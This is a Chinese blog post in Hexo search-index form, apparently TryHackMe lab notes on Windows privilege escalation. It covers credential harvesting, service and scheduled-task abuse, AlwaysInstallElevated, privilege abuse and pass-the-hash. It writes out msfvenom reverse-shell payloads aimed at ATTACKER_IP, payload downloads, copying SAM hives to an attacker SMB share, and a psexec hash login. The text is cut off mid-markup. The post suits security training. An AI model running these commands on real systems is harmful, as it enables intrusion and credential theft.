<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>win提权</title>
      <link href="/2025/03/20/win%E6%8F%90%E6%9D%83/"/>
      <url>/2025/03/20/win%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="win的提权"><a href="#win的提权" class="headerlink" title="win的提权"></a>win的提权</h3><h5 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h5><p>纯命令行</p><p>xfreerdp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:&lt;远程IP&gt; /u:&lt;用户名&gt; /p:&lt;密码&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>界面</p><p>remmina</p><h5 id="Powershell历史"><a href="#Powershell历史" class="headerlink" title="Powershell历史"></a>Powershell历史</h5><p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命令行中直接运行包含密码的命令，则稍后可以从 <code>cmd.exe</code>提示符中使用以下命令检索该密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">%userprofile%</span><br><span class="line">这是 Windows 的环境变量，表示当前用户的主目录（Home 目录）。</span><br><span class="line">如果要在powershell执行命令我们要把%userprofile%换为$Env：userprofile</span><br></pre></td></tr></table></figure><p><img src="/tu/image-20250310224125306.png" alt="image-20250310224125306"></p><h5 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h5><p>Windows 允许我们使用其他用户的凭据。此函数还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p><p><code>cmdkey /list</code> 用于列出当前用户存储的凭据（如用户名和密码），这些凭据通常用于自动登录到远程计算机、网络共享或其他受身份验证保护的资源。</p><p><img src="/tu/image-20250310224150121.png" alt="image-20250310224150121"></p><p>如果您发现任何值得尝试的凭据，可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p>该命令用于以 <code>admin</code> 用户的身份运行 <code>cmd.exe</code>（命令提示符），并使用 <code>savecred</code> 选项存储密码，以后运行相同的命令时无需再次输入密码。</p><p>这里发现哪个用户有凭证就使用哪个用户</p><p>以下是在文件上查找数据库连接字符串的快速方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><p>该命令用于在 <code>web.config</code> 配置文件中查找包含 <code>connectionString</code> 的行，通常用于查找数据库连接字符串。</p><h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><p>是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储会话，其中 IP、用户和其他配置可以存储以供以后使用。虽然 PuTTY 不允许用户存储他们的 SSH 密码，但它会存储包含明文身份验证凭据的代理配置</p><p>用于在注册表中查询 PuTTY 的会话配置，筛选出包含 “Proxy” 的项。这可以帮助您查看各个会话的代理设置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure><h3 id="Scheduled-Tasks-计划任务"><a href="#Scheduled-Tasks-计划任务" class="headerlink" title="Scheduled Tasks 计划任务"></a>Scheduled Tasks 计划任务</h3><p>可以使用 <code>schtasks</code> 命令从命令行列出计划任务，不带任何选项。要检索有关任何服务的详细信息，您可以使用类似于以下的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure><p>您将获得有关任务的大量信息，但对我们来说重要的是“Task to Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将用于执行任务的用户。</p><p>如果我们的当前用户可以修改或覆盖 “Task to Run” 可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而产生简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code>：</p><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成一个恶意的 MSI 文件，该文件将以管理员权限运行。</p><p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p><p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer </p><p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</p><p>为了能够利用此漏洞，应同时设置两者。否则，将无法进行利用。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>由于这是一个反向 shell，因此您还应该运行相应配置的 Metasploit Handler 模块。传输已创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><p>该命令使用 <strong>Windows Installer (<code>msiexec</code>)</strong> 在 <strong>静默模式</strong> 下安装指定的 MSI 软件包 (<code>malicious.msi</code>)。</p><h3 id="对服务可执行文件的不安全权限"><a href="#对服务可执行文件的不安全权限" class="headerlink" title="对服务可执行文件的不安全权限"></a>对服务可执行文件的不安全权限</h3><p>Windows 服务由<strong>服务控制管理器</strong> （SCM） 管理。SCM 是一个过程，负责根据需要管理服务的状态，检查任何给定服务的当前状态，并通常提供一种配置服务的方法。</p><p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，该可执行文件将由 SCM 运行。请务必注意，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此无法将任何可执行文件作为服务成功启动。每个服务还指定运行服务的用户帐户。</p><p>这个可以理解为我们可以对一个服务的执行文件有一个权限可以进行移动改名什么的然后我们将我们构造的恶意文件去替换服务关联的可执行文件</p><p>首先，我们将使用 <code>sc</code> 查询服务配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc qc apphostsvc</span><br></pre></td></tr></table></figure><p><img src="/tu/image-20250313211322520.png" alt="image-20250313211322520"></p><p><strong>BINARY_PATH_NAME</strong> 参数指定关联的可执行文件</p><p>用于运行服务的帐户显示在 <strong>SERVICE_START_NAME</strong> 参数上</p><p>比如我们查询到</p><p>文件位置后使用 msfvenom 生成一个 exe-service 有效负载，并通过 python Web 服务器提供它</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>然后在目标靶机上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure><p>然后进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure><p>然后在我们攻击机上起一个监听即可</p><p>然后只要服务重启我们就可以</p><p>得到shell了</p><h3 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h3><p>使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，会发生非常特殊的行为</p><p>例如:</p><p><img src="/tu/image-20250313211424055.png" alt="image-20250313211424055"></p><p>当 SCM 尝试执行关联的二进制文件时，会出现问题。由于 “Disk Sorter Enterprise” 文件夹的名称上有空格，因此命令变得不明确，并且 SCM 不知道您尝试执行以下哪项作</p><p>首先，搜索 <code>C：\\MyPrograms\\Disk.exe</code>。如果存在，则服务将运行此可执行文件。</p><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，则服务将运行此可执行文件。</p><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预期会成功，并且通常会在默认安装中运行。</p><p>所以我们可以创建一个恶意文件顶替关联文件利用机制让其执行我们的恶意文件比如我们创建一个C：\MyPrograms\Disk.exe</p><p>或者是C:\MyPrograms\Disk Sorter.exe</p><p>虽然默认情况下，大多数服务可执行文件将安装在 <code>C：\Program Files</code> 或 <code>C：\Program Files （x86）</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改了已安装文件夹的权限，使服务容易受到攻击。- </p><p>管理员可能决定在非默认路径中安装服务二进制文件。如果这样的路径是全局可写的，则可以利用此漏洞。</p><p>icacls可用来检查权限</p><p>例:</p><p><img src="/tu/image-20250313212200593.png" alt="image-20250313212200593"></p><p><img src="/tu/image-20250313212236780.png" alt="image-20250313212236780"></p><p>使用 msfvenom 创建 exe-service 负载并将其传输到目标主机的过程与以前相同，因此请随意创建以下负载并像以前一样将其上传到服务器。我们还将启动一个侦听器，以便在执行时接收反向 shell：</p><p>有效负载进入服务器后，将其移动到可能发生劫持的任何位置。在本例中，我们会将有效负载移动到 <code>C：\MyPrograms\Disk.exe</code>。我们还将授予 Everyone 对该文件的完全权限，以确保服务可以执行该文件：</p><p><img src="/tu/image-20250313215705636.png" alt="image-20250313215705636"></p><h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>如果服务的可执行 DACL 配置正确，并且服务的二进制路径被正确引用，则您可能仍有很小的机会利用该服务。如果服务 DACL（而不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p><p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。为方便起见，C<code>：\\tools</code> 中提供了一份副本。检查 thmservice 服务 DACL 的命令为：</p><p><img src="/tu/image-20250313220059481.png" alt="image-20250313220059481"></p><p>这里我们可以看到 <code>BUILTIN\\Users</code> 组具有 SERVICE_ALL_ACCESS 权限，这意味着任何用户都可以重新配置服务。</p><p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的机器上为它启动一个监听器：</p><p><img src="/tu/image-20250313220115972.png" alt="image-20250313220115972"></p><p>然后，我们会将反向 shell 可执行文件传输到目标计算机并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。随意使用 wget 传输可执行文件并将其移动到所需位置。请记住向 Everyone 授予执行有效负载的权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure><p>要更改服务的关联可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后的空格）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure><h3 id="滥用危险权限"><a href="#滥用危险权限" class="headerlink" title="滥用危险权限"></a>滥用危险权限</h3><p>权限是帐户执行特定系统相关任务时必须拥有的权限。这些任务可以像关闭计算机的权限一样简单，也可以绕过某些基于 DACL 的访问控制的权限。</p><p>每个用户都有一组分配的权限，可以使用以下命令检查这些权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p><p>展示如何滥用您能找到的一些最常见的特权。</p><h4 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h4><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p><p>拥有此权限，攻击者可以使用多种技术轻松提升系统的权限。我们将查看的配置包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p><p>此帐户是“Backup Operators”组的一部分，默认情况下，该组被授予 SeBackup 和 SeRestore 权限。我们需要使用 “Open as administrator（以管理员身份打开）”选项打开命令提示符以使用这些权限。系统将要求我们再次输入密码以获取提升的控制台：</p><p><img src="/tu/image-20250317185406640.png" alt="image-20250317185406640"></p><p>shell弹出来后进行一个简单的提权</p><p><img src="/tu/image-20250317185518767.png" alt="image-20250317185518767"></p><p>首先备份一个</p><p><strong><code>hklm\system</code></strong></p><ul><li>备份 <code>HKEY_LOCAL_MACHINE\SYSTEM</code>，其中包含系统配置、驱动程序信息等关键数据。</li><li>该 Hive 可用于提取 <strong>系统启动信息、LSA Secrets、SAM 账户解密密钥</strong> 等。</li></ul><p><strong><code>hklm\sam</code></strong></p><ul><li>备份 <code>HKEY_LOCAL_MACHINE\SAM</code>，它存储 Windows 本地账户信息。</li><li>该 Hive 可用于提取 <strong>用户哈希密码（NTLM Hash）</strong>。</li></ul><p><strong>获取 Windows 本地账户的 NTLM Hash</strong></p><ul><li><p><code>HKLM\SAM</code> 存储用户凭据，但它是加密的。</p></li><li><p><code>HKLM\SYSTEM</code> 里存有解密密钥，可用来解密 <code>SAM</code> 中的 NTLM Hash。</p><p>然后使用一些方法将其copy到你的攻击机上</p><p>下面我们演示用smb服务来将文件传到攻击机上</p><p>你的命令在攻击者机器  上使用 <strong>Impacket</strong> 提供了一个 SMB 共享服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure><p>这将创建一个名为 <code>public</code> 的共享，指向<code>共享</code>目录，这需要我们当前 Windows 会话的用户名和密码。在此之后，我们可以使用 Windows 机器中的 <code>copy</code> 命令将两个文件传输到我们的 攻击机</p></li></ul><p><img src="/tu/image-20250317185803701.png" alt="image-20250317185803701"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure><p>使用 impacket 检索用户的密码哈希值：</p><p><img src="/tu/image-20250317190128805.png" alt="image-20250317190128805"></p><p>然后就可以使用Administrator 的哈希来执行 Pass-the-Hash 攻击，并以 SYSTEM 权限访问目标计算机：</p><h5 id="补充Pass-the-Hash-Pass-The-Ticket"><a href="#补充Pass-the-Hash-Pass-The-Ticket" class="headerlink" title="补充Pass-the-Hash,Pass The Ticket"></a>补充Pass-the-Hash,Pass The Ticket</h5><p>这里对 Pass-the-Hash 进行一个扩展补充</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</span><br><span class="line"></span><br><span class="line">虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</span><br></pre></td></tr></table></figure><p>Pass The Ticket</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">票据传递攻击（Pass The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。</span><br><span class="line">常用的攻击方式：MS14-068、黄金票据、白银票据等。</span><br></pre></td></tr></table></figure><p>PAC<br>微软在Windows平台上对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书。</p><p>在一个域中，通过 User 的 SID 和所在组 Group 的 SID 来确定该用户所拥有的权限。所以 PAC 包含 Client 的 User 的 SID、Group 的 SID。PAC 为了保证自身的合法性，还包含 2 个签名。</p><p>（1）Client 向 AS 请求认证，验证完Client的身份后，AS 在返回 TGT 时，生成 PAC，以及用于确保 PAC 不被篡改的两个签名，一个签名的密钥为 KDC用户（krbtgt） 的 NTLM Hash，另一个签名的密钥为 Server 的 NTLM Hash，而签名的内容主要为 User SID、Group SID </p><p><img src="/tu/56260b9c801216db85604fc05602c7b0.png" alt="img"></p><p>Client向 TGS 发送请求，来获取访问 Server的Ticket 。TGS 对TGS Request 中的 TGT 解密，并通过两个签名来验证 PAC 的合法性。若验证通过，TGS 会重新生成两个新的签名保证 PAC 不被篡改。第一个签名的密钥为 Server 的 NTLM Hash，第二个密钥为 Server 与 Client 的临时会话密钥 Session Key（Server-Client）。新的 PAC 会被放置在签发的访问票据 Ticket 中，使用 Server 的 NTLM Hash进行加密。<br><img src="/tu/bbc787a1a68f2a6f15fdbd9e65eee5e1.png" alt="img"></p><p>Client 使用 Ticket 向 Server 请求相应的资源， Server收到请求，将 Ticket 解密并验证，校验 PAC 中的两个签名，验证 PAC 的合法性，之后根据 PAC 得知Client的权限，让其访问对应资源。</p><p>3、漏洞产生原理<br>Client 在向 AS 发送请求时，可以设置一个名为 include-pac 的字段为 False，而后 AS 生成的 TGT 并不会含有PAC，该字段默认为 True。在 Client 收到不含 PAC 的 TGT 后，可以添加一个 PAC 放于TGS Request 的数据包中，而 TGS 收到这个请求的数据包时，仍能正确解析出放在 TGS Request 中其他位置的 PAC 信息，因为 KDC 允许用户使用这样的构造。</p><p>在 KDC 对 PAC 进行验证时，对于PAC中的签名算法，虽然原则上规定使用密钥加密的签名算法，但微软在实际场景中却允许 Client 指定任意签名算法。所以Client 构造一个PAC，其中添加高权限的User SID 与 Group SID信息，并指定使用MD5进行签名，只要TGS Requset 数据不丢失，那么该伪造的 PAC 就能被验证通过。</p><p>PAC 验证通过后，KDC 会将 PAC 中的 User SID、Group SID 取出来，重新使用KDC用户（krbtgt） 的 NTLM Hash 和 Server 的 NTLM Hash 分别生成两个新的签名。之后生成一个新的 TGT ，并把 PAC放入其中，加密后发送给 Client，而不是发送 Ticket 给Client。</p><p><img src="/tu/ebef05203431531694a4817c0574f91a.png" alt="img"></p><p>参考:[渗透测试中的域渗透之MS14-068域控提权+票据传递攻击PTT-CSDN博客](<a href="https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88Pass">https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=票据传递攻击（Pass</a> The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。,PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。 常用的攻击方式：MS14-068、黄金票据、白银票据等。)</p><p>[域渗透-哈希传递攻击(Pass The Hash&#x2F;Key) - 知乎](<a href="https://zhuanlan.zhihu.com/p/472019671#:~:text=%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92">https://zhuanlan.zhihu.com/p/472019671#:~:text=哈希传递</a> (pth)攻击是指攻击者可以通过捕获密码的hash值 (对应着密码的值)%2C然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。,因为对于每个Session hash值都是固定的，除非密码被修改了 (需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@目标ip</span><br></pre></td></tr></table></figure><h4 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h4><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 运行的服务并获取该服务的可执行文件的所有权。但是，对于这项任务，我们将采取不同的路线。</p><p>要获得 SeTakeOwnership 权限，我们需要使用 “Open as administrator” 选项打开命令提示符。系统将要求我们输入密码以获取提升的控制台：</p><p><img src="/tu/33303d0cde736589d2838ee894379ff2.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;33303d0cde736589d2838ee894379ff2.png"></p><p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span><br></pre></td></tr></table></figure><p>由于 Utilman 是以 SYSTEM 权限运行的，如果我们将原始的二进制文件替换为我们构建的payload文件，我们将有效地获得目标机的 SYSTEM 权限。 由于我们可以拥有任何文件的所有权，因此替换原始二进制文件是微不足道的。 要替换 utilman，我们将首先在目标机上使用以下命令获取它的所有权，具体命令和执行结果如下：</p><p>这次我们将滥用 utilman.exe 来提升权限。 Utilman 是一个内置的 Windows 应用程序，用于在计算机锁定屏幕期间 提供“轻松访问”选项：</p><p><img src="/tu/a5437a609e41d982b320967667e9b97a.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;a5437a609e41d982b320967667e9b97a.png"></p><p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们为任何我们喜欢的有效负载替换原始二进制文件，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p><p>要替换 utilman，我们首先使用以下命令获取它的所有权：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.</span><br></pre></td></tr></table></figure><p>请注意，成为文件的所有者并不一定意味着您对它拥有权限，但作为所有者，您可以为自己分配所需的任何权限。要授予用户对 utilman.exe 的完全权限，您可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line">processed file: Utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure><p>在此之后，我们将 utilman.exe 替换为 cmd.exe 的副本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\&gt; copy cmd.exe utilman.exe</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure><p>要触发 utilman，我们将从开始按钮锁定屏幕：</p><p><img src="/tu/dd7290ca93369cee33182023cb9190ff.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;dd7290ca93369cee33182023cb9190ff.png"></p><p>最后，继续单击“Ease of Access”按钮，该按钮utilman.exe SYSTEM 权限运行。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p><p><img src="/tu/1401bc3dcb1e4eb84f526b95567a5ef8.png" alt="utilman shell"></p><h4 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h4><p>这些权限允许进程模拟其他用户并代表他们执行作。模拟通常包括能够在其他用户的安全上下文下生成进程或线程。</p><p>当您考虑 FTP 服务器的工作原理时，很容易理解模拟。FTP 服务器必须限制用户仅访问应允许他们查看的文件。</p><p><img src="/tu/6e5768172fbb97d6777dde7e15a3fcfc.png" alt="img"></p><p>使用 ftp 的令牌不是最好的主意有几个原因：- 为了正确提供文件，<code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户使用 <code>ftp</code>。这增加了复杂性，因为我们必须为每个提供的文件&#x2F;目录手动配置特定权限。- 对于作系统，所有文件都由用户 <code>ftp</code> 访问，而与当前登录到 FTP 服务的用户无关。这使得无法将授权委托给作系统;因此，FTP 服务必须实现它。- 如果 FTP 服务在某个时候遭到入侵，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p><p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它代表他们执行任何任务：</p><p><img src="/tu/89e74e14454edc10fa2bd541ac359772.png" alt="img"></p><p>现在，如果用户 Ann 登录到 FTP 服务，并且 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件就不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且作系统会处理授权。由于 FTP 服务正在模拟 Ann，因此在该会话期间无法访问 Jude 或 Bill 的文件。</p><p>作为攻击者，如果我们设法使用 SeImpersonate 或 SeAssignPrimaryToken 权限控制进程，我们可以模拟连接到该进程并进行身份验证的任何用户。</p><p>在 Windows 系统中，您会发现 LOCAL SERVICE 和 NETWORK SERVICE ACCOUNTS 已经具有此类权限。由于这些帐户用于使用受限帐户生成服务，因此在服务需要时允许它们模拟连接用户是有意义的。Internet Information Services （IIS） 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p><p>要使用此类帐户提升权限，攻击者需要满足以下条件：1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以便进行模拟。2. 找到一种方法来强制特权用户连接并验证生成的恶意进程。</p><p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p><p>首先，假设我们已经入侵了在 IIS 上运行的网站，并且我们已经在以下地址植入了一个 Web shell：</p><p>我们可以使用 Web Shell 来检查被盗用账户的分配权限，并确认我们拥有此任务所需的两种权限：</p><p><img src="/tu/4603506a36f4bbda602dc67cdc845d9f.png" alt="Webshell impersonate privileges"></p><p>要使用 RogueWinRM，我们首先需要将漏洞利用程序上传到目标计算机。为方便起见，这已经完成，您可以在 <code>C：\tools\</code> 文件夹中找到该漏洞。</p><p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建与端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台的端口，以便通过网络远程使用。可以将其视为 SSH，但使用 Powershell。</p><p>如果由于某种原因，WinRM 服务未在受害者服务器上运行，攻击者可以在端口 5985 上启动虚假的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有 SeImpersonate 权限，则他可以代表连接用户执行任何命令，即 SYSTEM。</p><p>在运行漏洞之前，我们将启动一个 netcat 侦听器，以便在攻击者的机器上接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td 